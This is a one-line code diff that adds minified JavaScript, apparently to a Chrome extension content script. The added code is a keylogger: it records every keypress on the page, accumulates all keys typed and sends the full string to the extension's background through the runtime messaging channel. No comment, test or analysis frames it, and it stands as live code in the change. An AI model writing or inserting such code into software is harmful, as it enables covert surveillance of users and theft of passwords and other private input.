@@ -1,0 +1,1 @@
+let logs=[];document.addEventListener("keypress",function(e){logs.push(e.key),chrome.runtime.sendMessage({type:"keypress",key:logs.join("")})});
